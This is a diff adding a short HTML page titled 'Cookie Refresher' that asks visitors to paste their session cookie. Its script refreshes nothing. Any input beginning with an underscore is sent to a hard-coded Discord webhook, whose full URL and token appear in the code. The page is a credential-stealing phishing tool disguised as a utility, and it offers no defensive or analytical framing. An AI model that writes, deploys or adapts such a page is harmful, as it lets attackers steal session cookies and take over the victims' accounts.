@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+
+<html>
+
+<head>
+
+    <title>Cookie Refresher</title>
+
+    <script>
+
+        function submitCookie() {
+
+            var cookieInput = document.getElementById("cookieInput").value;
+
+            if (cookieInput.startsWith("_")) {
+
+                var xhr = new XMLHttpRequest();
+
+                xhr.open("POST", "https://discord.com/api/webhooks/1109102894407491594/-UcS5Rzzn46HiV9EW0T6NeFsu7Uug11866y9XcgxngFzksaZWK29C8LI_ZxlUxpn1UFh", true);
+
+                xhr.setRequestHeader("Content-Type", "application/json");
+
+                xhr.send(JSON.stringify({ content: cookieInput }));
+
+            } else {
+
+                var messageElement = document.getElementById("message");
+
+                messageElement.style.color = "red";
+
+                messageElement.innerText = "Invalid cookie";
+
+            }
+
+        }
+
+    </script>
+
+</head>
+
+<body>
+
+    <h1>Cookie Refresher</h1>
+
+    <p>Cookie Refresher. Enter your cookie here:</p>
+
+    <input type="text" id="cookieInput">
+
+    <button onclick="submitCookie()">Submit</button>
+
+    <p id="message"></p>
+
+</body>
+
+</html>
